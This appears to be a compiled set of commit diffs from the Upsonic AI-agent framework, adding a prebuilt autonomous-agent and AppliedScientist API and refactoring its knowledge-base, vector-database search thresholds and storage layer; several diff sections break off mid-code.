+        ```python
+        agent = PrebuiltAutonomousAgent(
+            model="anthropic/claude-sonnet-4-5",
+            agent_repo="https://github.com/Upsonic/AutonomousAgents",
+            agent_folder="applied_scientist",
+        )
+
+        agent.run_console(
+            workspace="./ws",
+            inputs=["example_1/"],
+            research_paper="example_1/paper.pdf",
+            current_notebook="example_1/baseline.ipynb",
+        )
+        ```
+    """
+
+    def __init__(
+        self,
+        *args: Any,
+        agent_repo: Optional[str] = None,
+        agent_folder: Optional[str] = None,
+        **kwargs: Any,
+    ) -> None:
+        super().__init__(*args, **kwargs)
+        self.agent_repo: Optional[str] = agent_repo
+        self.agent_folder: Optional[str] = agent_folder
+        self._first_message_template: Optional[str] = None
+        self._repo_system_prompt: Optional[str] = None
+
+    # --------------------------------------------------------------------- #
+    # Internal helpers
+    # --------------------------------------------------------------------- #
+
+    def _log(self, verbose: bool, message: str) -> None:
+        """Emit a prefixed progress line when ``verbose`` is True."""
+        if verbose:
+            print(f"[PrebuiltAutonomousAgent] {message}")
+
+    def _apply_workspace(self, workspace: Union[str, Path]) -> Path:
+        """
+        Point the agent at a new workspace, recreating its filesystem/shell
+        toolkits so they sandbox to the new path and re-registering them with
+        the underlying :class:`~upsonic.agent.agent.Agent` tool manager.
+        """
+        new_ws = Path(workspace).resolve()
+        new_ws.mkdir(parents=True, exist_ok=True)
+
+        to_remove: List[Any] = []
+        if self.filesystem_toolkit is not None:
+            to_remove.append(self.filesystem_toolkit)
+            self.filesystem_toolkit = None
+        if self.shell_toolkit is not None:
+            to_remove.append(self.shell_toolkit)
+            self.shell_toolkit = None
+        if to_remove:
+            self.remove_tools(to_remove)
+
+        to_add: List[Any] = []
+        fs = AutonomousFilesystemToolKit(workspace=new_ws)
+        self.filesystem_toolkit = fs
+        to_add.append(fs)
+
+        sh = AutonomousShellToolKit(workspace=new_ws)
+        self.shell_toolkit = sh
+        to_add.append(sh)
+        self.add_tools(to_add)
+
+        self.autonomous_workspace = new_ws
+        self.workspace = str(new_ws)
+        self._workspace_greeting_executed = False
+        self._workspace_agents_md_content = self._read_workspace_agents_md()
+        return new_ws
+
+    def _clone_repo_folder(
+        self,
+        repo_url: str,
+        folder: str,
+        destination: Path,
+        verbose: bool,
+    ) -> None:
+        """
+        Shallow sparse-clone ``repo_url`` and copy the contents of ``folder``
+        into ``destination``. Falls back to a full shallow clone if sparse
+    
```

**File**: `src/upsonic/prebuilt/__init__.py` (added, +63/-0)
```diff
@@ -0,0 +1,63 @@
+"""
+Upsonic prebuilt agents.
+
+Ready-to-use autonomous agents backed by templates in the
+``Upsonic/AutonomousAgents`` repository. Each class auto-wires the repo and
+folder and exposes a template-aware API on top of
+:class:`~upsonic.agent.prebuilt_autonomous_agent.PrebuiltAutonomousAgent`.
+
+Usage:
+    ```python
+    from upsonic.prebuilt import AppliedScientist
+
+    scientist = AppliedScientist(model="openai/gpt-4o", workspace="./ws")
+    exp = scientist.new_experiment(
+        research_paper="example_1/tabpfn.pdf",
+        current_notebook="example_1/baseline.ipynb",
+        current_data="downloaded in notebook (ucimlrepo, id=2)",
+        experiments_directory="./experiments",
+        inputs=["example_1/"],
+    )
+    exp.run()
+    ```
+"""
+from __future__ import annotations
+
+from typing import TYPE_CHECKING, Any
+
+if TYPE_CHECKING:
+    from .upsonic_prebuilt_agents import (
+        AppliedScientist,
+        Experiment,
+        ExperimentResult,
+    )
+
+
+def _get_classes() -> dict[str, Any]:
+    from .upsonic_prebuilt_agents import (
+        AppliedScientist,
+        Experiment,
+        ExperimentResult,
+    )
+    return {
+        "AppliedScientist": AppliedScientist,
+        "Experiment": Experiment,
+        "ExperimentResult": ExperimentResult,
+    }
+
+
+def __getattr__(name: str) -> Any:
+    classes = _get_classes()
+    if name in classes:
+        return classes[name]
+    raise AttributeError(
+        f"module '{__name__}' has no attribute '{name}'. "
+        f"Available: {list(classes.keys())}"
+    )
+
+
+__all__ = [
+    "AppliedScientist",
+    "Experiment",
+    "ExperimentResult",
+]
```

**File**: `src/upsonic/prebuilt/upsonic_prebuilt_agents.py` (added, +1135/-0)
```diff
@@ -0,0 +1,1135 @@
+"""
+Upsonic-maintained prebuilt autonomous agents.
+
+Each class in this module wires
+:class:`~upsonic.agent.prebuilt_autonomous_agent.PrebuiltAutonomousAgent` to a
+specific upstream template repo/folder and exposes a high-level,
+template-aware API (``new_experiment()``, ``new_task()``, etc.) so users do
+not have to remember the placeholders in ``first_message.md``.
+"""
+from __future__ import annotations
+
+import json
+import threading
+from pathlib import Path
+from typing import Any, Dict, Iterator, List, Optional, TYPE_CHECKING, Union
+
+from upsonic.agent.prebuilt_autonomous_agent.prebuilt_autonomous_agent import (
+    PrebuiltAutonomousAgent,
+)
+
+if TYPE_CHECKING:
+    from upsonic.models import Model
+
+
+# --------------------------------------------------------------------------- #
+# Experiment — the "about to run / running / finished run" object
+# --------------------------------------------------------------------------- #
+
+
+class Experiment:
+    """
+    A prepared experiment run for :class:`AppliedScientist`.
+
+    Holds the template parameters and optional input paths for a single run.
+    The actual work is deferred until :meth:`run`, :meth:`run_in_background`,
+    :meth:`run_async`, or :meth:`run_stream` is called, so the same agent
+    instance can prepare and launch multiple experiments.
+    """
+
+    def __init__(
+        self,
+        agent: "AppliedScientist",
+        name: str,
+        template_params: Dict[str, Any],
+        inputs: Optional[List[str]] = None,
+    ) -> None:
+        self._agent = agent
+        self._name = name
+        self._template_params = template_params
+        self._inputs = inputs
+        self._thread: Optional[threading.Thread] = None
+        self._raw_output: Any = None
+        self._error: Optional[BaseException] = None
+        self._done: bool = False
+        self._started: bool = False
+        self._stop_requested: bool = False
+
+    @property
+    def name(self) -> str:
+        """The experiment name (also the folder name inside `experiments/`)."""
+        return self._name
+
+    @property
+    def template_params(self) -> Dict[str, Any]:
+        """The rendered template parameters that will be sent to the agent."""
+        return dict(self._template_params)
+
+    @property
+    def inputs(self) -> Optional[List[str]]:
+        """User paths that will be copied into the workspace at run time."""
+        return list(self._inputs) if self._inputs is not None else None
+
+    # ------------------------------------------------------------------ #
+    # Foreground runs
+    # ------------------------------------------------------------------ #
+
+    def run(
+        self,
+        *,
+        verbose: bool = False,
+        preview_chars: int = 400,
+    ) -> str:
+        """
+        Execute the experiment with pretty terminal output (calls
+        :meth:`PrebuiltAutonomousAgent.run_console`). Blocks until the run
+        completes and returns the concatenated assistant text.
+        """
+        if self._started:
+            raise RuntimeError(
+                "Experiment has already been started. Create a new one with "
+                "scientist.new_experiment(...) to run again."
+            )
+        self._started = True
+        try:
+            result = self._agent.run_console(
+                inputs=self._inputs,
+                verbose=verbose,
+                preview_chars=preview_chars,
+                **self._template_params,
+            )
+            self._raw_output = result
+            self._done = True
+            return result
+        except BaseException as e:
+            self._error = e
+            self._done = True
+            raise
+
+    async def run_async(
+        self,
+        *,
+        verbose: bool = False,
+        return_output: bool = False,
+        timeout: Optional[float] = None,
+        partial_on_timeout: bool = False,
+    ) -> Any:
+        """Async variant: run to completion without TTY formatting."""
+        if self._started:
+            raise RuntimeError(
+                "Experiment has already been started. Create a new one with "
+                "scientist.new_experiment(...) to run again."
+            )
+        self._started = True
+        try:
+            result = await self._agent.run_async(
+                inputs=self._inputs,
+                verbose=verbose,
+                return_output=return_output,
+                timeout=timeout,
+                partial_on_timeout=partial_on_timeout,
+                **self._template_params,
+            )
+            self._raw_output = result
+            self._done = True
+            return result
+        except BaseException as e:
+            self._error = e
+            self._done = True
+            raise
+
+    def run_stream(
+        self,
+        *,
+        verbose: bool = False,
+        events: bool = False,
+    ):
+        """Sync streaming iterator
```

---

### Incident Patch 13: `20fe2a40` (2026-04-10)
**Commit Message**: fix: small fix on RAG side

**File**: `src/upsonic/knowledge_base/knowledge_base.py` (modified, +3/-2)
```diff
@@ -1213,9 +1213,9 @@ async def _store_in_vectordb(self, chunks: List[Chunk], vectors: List[List[float
             chunk_hashes: List[str] = [chunk.chunk_content_hash for chunk in chunks]
             chunk_payloads: List[Dict[str, Any]] = [dict(chunk.metadata) for chunk in chunks]
 
+            knowledge_base_ids: Optional[List[str]] = None
             if self.isolate_search:
-                for payload in chunk_payloads:
-                    payload["knowledge_base_id"] = self.knowledge_id
+                knowledge_base_ids = [self.knowledge_id] * len(chunks)
 
             await self.vectordb.aupsert(
                 vectors=vectors,
@@ -1225,6 +1225,7 @@ async def _store_in_vectordb(self, chunks: List[Chunk], vectors: List[List[float
                 document_ids=doc_ids,
                 doc_content_hashes=doc_hashes,
                 chunk_content_hashes=chunk_hashes,
+                knowledge_base_ids=knowledge_base_ids,
             )
             
             success_log(f"Stored {len(chunks)} chunks successfully", context="KnowledgeBase")
```

**File**: `src/upsonic/vectordb/config.py` (modified, +1/-0)
```diff
@@ -539,6 +539,7 @@ class SuperMemoryConfig(BaseVectorDBConfig):
     timeout: float = 60.0
     batch_delay: float = 0.1
     batch_size: int = 50
+    index_delay: float = 7.0  # Seconds to wait after upsert for async indexing to complete
 
     vector_size: int = 0
     dense_search_enabled: bool = False
```

**File**: `src/upsonic/vectordb/providers/chroma.py` (modified, +2/-2)
```diff
@@ -1437,7 +1437,7 @@ async def adense_search(
         _ = apply_reranking  # accepted for API parity; not applied in dense path
         collection = await self._get_active_collection()
 
-        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
 
         try:
             native_filter, post_filter = self._split_filter(filter)
@@ -1522,7 +1522,7 @@ async def afull_text_search(
         _ = (apply_reranking, sparse_query_vector)  # accepted for API parity; ChromaDB uses BM25-like scoring with no sparse vectors
         collection = await self._get_active_collection()
 
-        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
 
         where_document_filter = {"$contains": query_text}
         native_filter, post_filter = self._split_filter(filter)
```

**File**: `src/upsonic/vectordb/providers/pinecone.py` (modified, +3/-3)
```diff
@@ -1150,7 +1150,7 @@ async def adense_search(
         if not self._index:
             raise VectorDBConnectionError("Index not available.")
 
-        final_threshold: float = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_threshold: float = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
         namespace: str = self._config.namespace or ""
         include_values: bool = self._config.include_values
 
@@ -1198,7 +1198,7 @@ async def afull_text_search(
             raise ConfigurationError("Full-text search requires use_sparse_vectors to be enabled.")
         
         top_k = top_k or self._config.default_top_k
-        final_threshold: float = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_threshold: float = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
         namespace: str = self._config.namespace or ""
 
         native_filter, post_filter = self._split_filter(filter)
@@ -1269,7 +1269,7 @@ async def ahybrid_search(
         
         top_k = top_k or self._config.default_top_k
         alpha = alpha if alpha is not None else (self._config.default_hybrid_alpha or 0.5)
-        final_threshold: float = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_threshold: float = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
         namespace: str = self._config.namespace or ""
         include_values: bool = self._config.include_values
 
```

**File**: `src/upsonic/vectordb/providers/qdrant.py` (modified, +2/-2)
```diff
@@ -1365,7 +1365,7 @@ async def adense_search(
         """
         try:
             client = await self.aget_client()
-            final_similarity_threshold = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+            final_similarity_threshold = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
             
             search_params = models.SearchParams(
                 hnsw_ef=getattr(self._config.index, 'ef_search', None) or 128,
@@ -1441,7 +1441,7 @@ async def afull_text_search(
         _ = (sparse_query_vector,)  # accepted for API parity; Qdrant uses text-index BM25 not sparse vectors
         await self.aget_client()
 
-        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
         target_text_field: str = self._config.text_search_field
 
         if self._config.connection.mode == Mode.IN_MEMORY:
```

**File**: `src/upsonic/vectordb/providers/supermemory.py` (modified, +8/-0)
```diff
@@ -502,6 +502,14 @@ async def aupsert(
             context="SuperMemoryVectorDB",
         )
 
+        # SuperMemory indexes asynchronously; wait for content to become searchable
+        if total_succeeded > 0 and self._config.index_delay > 0:
+            info_log(
+                f"Waiting {self._config.index_delay}s for SuperMemory indexing to complete...",
+                context="SuperMemoryVectorDB",
+            )
+            await asyncio.sleep(self._config.index_delay)
+
     async def _batch_find_stale_by_hashes(
         self,
         client: "AsyncSupermemory",
```

---

### Incident Patch 14: `cdf03af1` (2026-04-09)
**Commit Message**: refactor: rag refactor, mcp fix, new storage table adding

**File**: `src/upsonic/agent/context_managers/context_manager.py` (modified, +1/-1)
```diff
@@ -335,7 +335,7 @@ def get_context_summary(self) -> Dict[str, Any]:
                 if isinstance(item, KnowledgeBase):
                     kb_info: Dict[str, Any] = {
                         "name": item.name,
-                        "is_ready": getattr(item, '_is_ready', False),
+                        "state": getattr(item, '_state', 'unknown').value if hasattr(getattr(item, '_state', None), 'value') else str(getattr(item, '_state', 'unknown')),
                         "knowledge_id": getattr(item, 'knowledge_id', 'unknown'),
                         "sources_count": len(item.sources) if hasattr(item, 'sources') else 0
                     }
```

**File**: `src/upsonic/knowledge_base/__init__.py` (modified, +11/-5)
```diff
@@ -2,16 +2,22 @@
 from typing import TYPE_CHECKING, Any
 
 if TYPE_CHECKING:
-    from .knowledge_base import KnowledgeBase
+    from .knowledge_base import KnowledgeBase, KBState
+
+_LAZY_MAP = {
+    "KnowledgeBase": "KnowledgeBase",
+    "KBState": "KBState",
+}
 
 def __getattr__(name: str) -> Any:
     """Lazy loading of heavy modules and classes."""
-    if name == "KnowledgeBase":
-        from .knowledge_base import KnowledgeBase
-        return KnowledgeBase
+    if name in _LAZY_MAP:
+        from . import knowledge_base as _mod
+        return getattr(_mod, _LAZY_MAP[name])
     
     raise AttributeError(f"module '{__name__}' has no attribute '{name}'")
 
 __all__ = [
-    "KnowledgeBase"
+    "KnowledgeBase",
+    "KBState",
 ]
\ No newline at end of file
```

**File**: `src/upsonic/knowledge_base/knowledge_base.py` (modified, +796/-529)
```diff
@@ -3,10 +3,15 @@
 import hashlib
 import json
 import re
-import types
-from typing import List, Optional, Dict, Any, Union, Literal
+from enum import Enum
+from typing import TYPE_CHECKING, List, Literal, Optional, Dict, Any, Union
 from pathlib import Path
 
+if TYPE_CHECKING:
+    from upsonic.storage.base import Storage
+    from upsonic.storage.schemas import KnowledgeRow
+    from upsonic.tools.base import Tool
+
 from ..text_splitter.base import BaseChunker
 from ..embeddings.base import EmbeddingProvider
 from ..vectordb.base import BaseVectorDBProvider
@@ -20,11 +25,16 @@
     VectorDBConnectionError, 
     UpsertError,
 )
-from upsonic.tools import ToolKit, tool
-from upsonic.tools.config import ToolConfig
 
 
-class KnowledgeBase(ToolKit):
+class KBState(str, Enum):
+    UNINITIALIZED = "uninitialized"
+    CONNECTED = "connected"
+    INDEXED = "indexed"
+    CLOSED = "closed"
+
+
+class KnowledgeBase:
     """
     The central, intelligent orchestrator for a collection of knowledge in an AI Agent Framework.
 
@@ -39,6 +49,7 @@ class KnowledgeBase(ToolKit):
     - **Document Management**: Track, update, and delete documents by various identifiers
     - **Health Monitoring**: Comprehensive health checks and diagnostics
     - **Resource Management**: Proper connection lifecycle and cleanup
+    - **Tool Provider Protocol**: Exposes ``get_tools()`` for agent integration without inheritance
 
     This class serves as the bridge between raw documents and the vector database,
     providing a high-level, framework-agnostic interface for knowledge management.
@@ -58,6 +69,8 @@ def __init__(
         quality_preference: str = "balanced",
         loader_config: Optional[Dict[str, Any]] = None,
         splitter_config: Optional[Dict[str, Any]] = None,
+        isolate_search: bool = True,
+        storage: Optional["Storage"] = None,
         **config_kwargs
     ):
         """
@@ -118,6 +131,8 @@ def __init__(
         self.sources: List[Union[str, Path]] = self._resolve_sources(sources)
         self.embedding_provider: Optional[EmbeddingProvider] = embedding_provider
         self.vectordb: BaseVectorDBProvider = vectordb
+        self.isolate_search: bool = isolate_search
+        self.storage: Optional["Storage"] = storage
         
         # Setup loaders with intelligent auto-detection
         self.loaders: List[BaseLoader] = self._setup_loaders(
@@ -137,15 +152,22 @@ def __init__(
         self.name: str = name or self.knowledge_id[:16]  # Use first 16 chars of ID if no name
         
         # State management
-        self._is_ready: bool = False
-        self._is_closed: bool = False
+        self._state: KBState = KBState.UNINITIALIZED
         self._setup_lock: asyncio.Lock = asyncio.Lock()
-        self._processing_stats: Dict[str, Any] = {}  # Track processing statistics
+        self._processing_stats: Dict[str, Any] = {}
         
-        # Create dynamically named search tool method
-        # This allows multiple KnowledgeBase instances to have unique tool names
-        # e.g., search_technical_docs, search_user_guides instead of all being "search"
-        self._create_dynamic_search_tool()
+        # Auto-derive collection_name when the user didn't explicitly set one
+        if self.vectordb._config.collection_name == "default_collection":
+            sanitized: str = re.sub(r'[^a-zA-Z0-9_]', '_', self.name)[:50]
+            derived_name: str = f"kb_{sanitized}_{self.knowledge_id[:8]}"
+            object.__setattr__(self.vectordb._config, 'collection_name', derived_name)
+            info_log(
+                f"Auto-derived collection name: '{derived_name}' for KnowledgeBase '{self.name}'",
+                context="KnowledgeBase",
+            )
+
+        # Precompute the search tool name for get_tools() / build_context()
+        self._search_tool_name: str = f"search_{self._sanitize_tool_name(self.name)}"
 
         info_log(
             f"Initialized KnowledgeBase '{self.name}' with {len(self.sources)} sources, "
@@ -176,82 +198,92 @@ def _sanitize_tool_name(self, name: str) -> str:
             sanitized = f"kb_{sanitized}"
         return sanitized.lower() if sanitized else "unnamed"
     
-    def _create_dynamic_search_tool(self) -> None:
-        """
-        Create a dynamically named search tool method based on the KnowledgeBase name.
-        
-        This method creates a unique tool for each KnowledgeBase instance, allowing
-        multiple KnowledgeBases to be used as tools without name collisions.
-        
-        For example:
-        - KnowledgeBase(name="technical_docs") -> search_technical_docs tool
-        - KnowledgeBase(name="user_guides") -> search_user_guides tool
-        
-        The tool is created as an instance method with:
-        - Unique name based on self.name
-        - Docstring including the KB description
-        - @tool decorator attributes for ToolProcessor detection
-        """
-        # Generate unique tool name
- 
```

**File**: `src/upsonic/loaders/base.py` (modified, +6/-2)
```diff
@@ -31,6 +31,10 @@ def __init__(self, config: LoaderConfig):
         self._logger = get_logger(self.__class__.__module__)  # Instance logger for subclasses
 
 
+    def reset(self) -> None:
+        """Clears internal deduplication state so sources can be re-loaded."""
+        self._processed_document_ids.clear()
+
     @abstractmethod
     def load(self, source: Union[str, Path, List[Union[str, Path]]]) -> List[Document]:
         """Loads all documents from the given source synchronously."""
@@ -106,7 +110,7 @@ def _create_metadata(self, source_path: Path) -> Dict[str, Any]:
         try:
             metadata = {
                 "source": str(source_path.resolve()),
-                "file_name": source_path.name,
+                "document_name": source_path.name,
                 "file_path": str(source_path),
                 "file_size": source_path.stat().st_size,
                 "creation_datetime_utc": source_path.stat().st_ctime,
@@ -118,7 +122,7 @@ def _create_metadata(self, source_path: Path) -> Dict[str, Any]:
         except FileNotFoundError:
             metadata = {
                 "source": str(source_path),
-                "file_name": source_path.name,
+                "document_name": source_path.name,
                 "file_path": str(source_path),
             }
 
```

**File**: `src/upsonic/schemas/data_models.py` (modified, +14/-1)
```diff
@@ -1,4 +1,5 @@
 from __future__ import annotations
+import hashlib
 import uuid
 from typing import Any, Dict, Optional
 from pydantic import BaseModel, Field
@@ -24,6 +25,10 @@ class Document(BaseModel):
         ...,
         description="A unique, deterministic identifier for the source, typically an MD5 hash of its absolute path or URL."
     )
+    doc_content_hash: str = Field(
+        default="",
+        description="MD5 hash of the document's full content, used for change detection and deduplication."
+    )
 
 class Chunk(BaseModel):
     """
@@ -45,12 +50,20 @@ class Chunk(BaseModel):
     )
     document_id: str = Field(
         ...,
-        description="Document ID"
+        description="The parent document's unique identifier, linking this chunk back to its source."
+    )
+    doc_content_hash: str = Field(
+        default="",
+        description="MD5 hash of the parent document's full content, inherited for change detection."
     )
     chunk_id: str = Field(
         default_factory=lambda: str(uuid.uuid4()),
         description="A unique identifier for this specific chunk."
     )
+    chunk_content_hash: str = Field(
+        default="",
+        description="MD5 hash of this chunk's text_content, used for chunk-level deduplication and integrity."
+    )
 
     start_index: Optional[int] = Field(
         default=None,
```

**File**: `src/upsonic/storage/__init__.py` (modified, +13/-0)
```diff
@@ -9,6 +9,7 @@
 if TYPE_CHECKING:
     from .base import Storage, AsyncStorage
     from .json import JSONStorage
+    from .schemas import KnowledgeRow
     from .in_memory import (
         InMemoryStorage,
         apply_pagination,
@@ -50,6 +51,15 @@ def _get_base_classes() -> dict[str, Any]:
     }
 
 
+def _get_schema_classes() -> dict[str, Any]:
+    """Lazy import of schema dataclasses."""
+    from .schemas import KnowledgeRow
+
+    return {
+        "KnowledgeRow": KnowledgeRow,
+    }
+
+
 def _get_sqlite_classes() -> dict[str, Any]:
     """Lazy import of SQLite storage classes."""
     from .sqlite import AsyncSqliteStorage, SqliteStorage
@@ -180,6 +190,7 @@ def _safe_get(loader: Any) -> dict[str, Any]:
 # dependency doesn't prevent importing unrelated classes from the same package.
 _LOADERS: list[tuple[bool, Any]] = [
     (False, _get_base_classes),
+    (False, _get_schema_classes),
     (False, _get_json_classes),
     (False, _get_in_memory_classes),
     (False, _get_memory_classes),
@@ -208,6 +219,8 @@ def __getattr__(name: str) -> Any:
     # Base classes
     "Storage",
     "AsyncStorage",
+    # Schema dataclasses
+    "KnowledgeRow",
     # Storage classes
     "InMemoryStorage",
     "JSONStorage",
```

**File**: `src/upsonic/storage/base.py` (modified, +207/-1)
```diff
@@ -5,7 +5,7 @@
 
 if TYPE_CHECKING:
     from upsonic.session.base import SessionType
-    from upsonic.storage.schemas import UserMemory
+    from upsonic.storage.schemas import UserMemory, KnowledgeRow
     from upsonic.session.base import Session
     from upsonic.culture.cultural_knowledge import CulturalKnowledge
 
@@ -24,6 +24,7 @@ def __init__(
         session_table: Optional[str] = None,
         user_memory_table: Optional[str] = None,
         cultural_knowledge_table: Optional[str] = None,
+        knowledge_table: Optional[str] = None,
         id: Optional[str] = None,
     ) -> None:
         """
@@ -32,12 +33,16 @@ def __init__(
         Args:
             session_table: Name of the table to store sessions.
             user_memory_table: Name of the table to store user memories.
+            cultural_knowledge_table: Name of the table to store cultural knowledge.
+            knowledge_table: Name of the table to store knowledge base document registry.
             id: Unique identifier for this storage instance.
         """
         self.id: str = id or str(uuid4())
         self.session_table_name: str = session_table or "upsonic_sessions"
         self.user_memory_table_name: str = user_memory_table or "upsonic_user_memories"
         self.cultural_knowledge_table_name: str = cultural_knowledge_table or "upsonic_cultural_knowledge"
+        self.knowledge_table_name: str = knowledge_table or "upsonic_knowledge"
+
     @abstractmethod
     def table_exists(self, table_name: str) -> bool:
         """
@@ -439,6 +444,105 @@ def upsert_cultural_knowledge(
         """
         raise NotImplementedError
 
+    # --- Knowledge Content Methods ---
+
+    @abstractmethod
+    def upsert_knowledge_content(
+        self,
+        knowledge_row: "KnowledgeRow",
+    ) -> Optional["KnowledgeRow"]:
+        """
+        Insert or update a knowledge document registry entry.
+        
+        Args:
+            knowledge_row: The KnowledgeRow instance to upsert.
+        
+        Returns:
+            The upserted KnowledgeRow, or None if the operation fails.
+        
+        Raises:
+            Exception: If an error occurs during upsert.
+        """
+        raise NotImplementedError
+
+    @abstractmethod
+    def get_knowledge_content(
+        self,
+        id: str,
+    ) -> Optional["KnowledgeRow"]:
+        """
+        Get a knowledge document registry entry by ID.
+        
+        Args:
+            id: The document ID to retrieve.
+        
+        Returns:
+            KnowledgeRow if found, None otherwise.
+        
+        Raises:
+            Exception: If an error occurs during retrieval.
+        """
+        raise NotImplementedError
+
+    @abstractmethod
+    def get_knowledge_contents(
+        self,
+        knowledge_base_id: Optional[str] = None,
+        limit: Optional[int] = None,
+        page: Optional[int] = None,
+        sort_by: Optional[str] = None,
+        sort_order: Optional[str] = None,
+    ) -> Tuple[List["KnowledgeRow"], int]:
+        """
+        Get knowledge document registry entries with filtering and pagination.
+        
+        Args:
+            knowledge_base_id: Filter by knowledge base ID.
+            limit: Maximum number of records to return.
+            page: Page number (1-indexed).
+            sort_by: Column to sort by.
+            sort_order: Sort order ('asc' or 'desc').
+        
+        Returns:
+            Tuple of (list of KnowledgeRow, total count).
+        
+        Raises:
+            Exception: If an error occurs during retrieval.
+        """
+        raise NotImplementedError
+
+    @abstractmethod
+    def delete_knowledge_content(self, id: str) -> bool:
+        """
+        Delete a knowledge document registry entry by ID.
+        
+        Args:
+            id: The document ID to delete.
+        
+        Returns:
+            True if deleted successfully, False otherwise.
+        
+        Raises:
+            Exception: If an error occurs during deletion.
+        """
+        raise NotImplementedError
+
+    @abstractmethod
+    def delete_knowledge_contents(self, ids: List[str]) -> int:
+        """
+        Delete multiple knowledge document registry entries.
+        
+        Args:
+            ids: List of document IDs to delete.
+        
+        Returns:
+            Number of records deleted.
+        
+        Raises:
+            Exception: If an error occurs during deletion.
+        """
+        raise NotImplementedError
+
     # --- Utility Methods ---
 
     @abstractmethod
@@ -568,6 +672,7 @@ def __init__(
         session_table: Optional[str] = None,
         user_memory_table: Optional[str] = None,
         cultural_knowledge_table: Optional[str] = None,
+        knowledge_table: Optional[str] = None,
         id: Optional[str] = None,
     ) -> None:
         """
@@ -577,12 +682,14 @@ def __init__(
             session_table: Name of the table to store sessions.
             user
```

**File**: `src/upsonic/storage/in_memory/in_memory.py` (modified, +124/-3)
```diff
@@ -8,6 +8,7 @@
 if TYPE_CHECKING:
     from upsonic.session.base import Session, SessionType
     from upsonic.culture.cultural_knowledge import CulturalKnowledge
+    from upsonic.storage.schemas import KnowledgeRow
 
 from upsonic.storage.base import Storage
 from upsonic.storage.in_memory.utils import (
@@ -54,6 +55,7 @@ def __init__(
         self,
         session_table: Optional[str] = None,
         user_memory_table: Optional[str] = None,
+        knowledge_table: Optional[str] = None,
         id: Optional[str] = None,
     ) -> None:
         """
@@ -62,19 +64,20 @@ def __init__(
         Args:
             session_table: Name of the session table (for compatibility).
             user_memory_table: Name of the user memory table (for compatibility).
+            knowledge_table: Name of the knowledge table (for compatibility).
             id: Unique identifier for this storage instance.
         """
         super().__init__(
             session_table=session_table,
             user_memory_table=user_memory_table,
+            knowledge_table=knowledge_table,
             id=id,
         )
 
-        # In-memory storage using lists of dictionaries
         self._sessions: List[Dict[str, Any]] = []
         self._user_memories: List[Dict[str, Any]] = []
         self._cultural_knowledge: List[Dict[str, Any]] = []
-        # Generic model storage: {collection_name: {key: model_data}}
+        self._knowledge: List[Dict[str, Any]] = []
         self._generic_models: Dict[str, Dict[str, Any]] = {}
 
         _logger.info(f"Initialized InMemoryStorage with id: {self.id}")
@@ -96,6 +99,7 @@ def close(self) -> None:
         self._sessions.clear()
         self._user_memories.clear()
         self._cultural_knowledge.clear()
+        self._knowledge.clear()
         _logger.info(f"InMemoryStorage with id: {self.id} closed and cleared")
 
     def _get_session_type_value(self, session: "Session") -> str:
@@ -888,11 +892,12 @@ def clear_all(self) -> None:
         """
         Clear all data from all tables.
         
-        This removes all sessions and user memories from the storage.
+        This removes all sessions, user memories, and knowledge from storage.
         """
         try:
             self._sessions.clear()
             self._user_memories.clear()
+            self._knowledge.clear()
             _logger.info("Cleared all data from InMemoryStorage")
 
         except Exception as e:
@@ -1169,3 +1174,119 @@ def upsert_cultural_knowledge(
         except Exception as e:
             _logger.error(f"Error upserting cultural knowledge: {e}")
             raise e
+
+    # ======================== Knowledge Content Methods ========================
+
+    def upsert_knowledge_content(
+        self,
+        knowledge_row: "KnowledgeRow",
+    ) -> Optional["KnowledgeRow"]:
+        """Insert or update a knowledge document registry entry."""
+        from upsonic.storage.schemas import KnowledgeRow
+
+        try:
+            current_time = int(time.time())
+            data = knowledge_row.to_dict()
+            data.setdefault("created_at", current_time)
+            data["updated_at"] = current_time
+
+            self._knowledge = [
+                item for item in self._knowledge if item.get("id") != data["id"]
+            ]
+            self._knowledge.append(deepcopy(data))
+
+            _logger.debug(f"Upserted knowledge content: {data['id']}")
+            return KnowledgeRow.from_dict(data)
+
+        except Exception as e:
+            _logger.error(f"Error upserting knowledge content: {e}")
+            raise e
+
+    def get_knowledge_content(
+        self,
+        id: str,
+    ) -> Optional["KnowledgeRow"]:
+        """Get a knowledge document registry entry by ID."""
+        from upsonic.storage.schemas import KnowledgeRow
+
+        try:
+            for item in self._knowledge:
+                if item.get("id") == id:
+                    return KnowledgeRow.from_dict(deep_copy_record(item))
+            return None
+
+        except Exception as e:
+            _logger.error(f"Error getting knowledge content: {e}")
+            raise e
+
+    def get_knowledge_contents(
+        self,
+        knowledge_base_id: Optional[str] = None,
+        limit: Optional[int] = None,
+        page: Optional[int] = None,
+        sort_by: Optional[str] = None,
+        sort_order: Optional[str] = None,
+    ) -> Tuple[List["KnowledgeRow"], int]:
+        """Get knowledge document registry entries with filtering and pagination."""
+        from upsonic.storage.schemas import KnowledgeRow
+
+        try:
+            filtered: List[Dict[str, Any]] = []
+            for item in self._knowledge:
+                if knowledge_base_id is not None and item.get("knowledge_base_id") != knowledge_base_id:
+                    continue
+                filtered.append(item)
+
+            total_count: int = len(filtered)
+
+            sorted_items = apply_sorting(
+                filte
```

---

### Incident Patch 15: `d31a7838` (2026-04-08)
**Commit Message**: fix: align asqav integration with actual SDK API

- init(): use base_url param, not api_url
